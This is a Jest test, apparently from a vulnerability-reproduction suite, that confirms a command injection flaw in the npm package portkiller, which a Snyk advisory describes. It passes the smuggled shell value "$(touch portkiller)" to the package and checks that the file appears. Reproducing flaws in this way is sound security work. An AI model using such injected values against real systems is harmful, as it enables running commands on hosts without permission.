//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078537
test("Command Injection in portkiller", (done) => {
  expect.assertions(2);
  const portkiller = require("portkiller");
  const fs = require("fs");
  const path = "./portkiller";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  portkiller("$(touch portkiller)");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
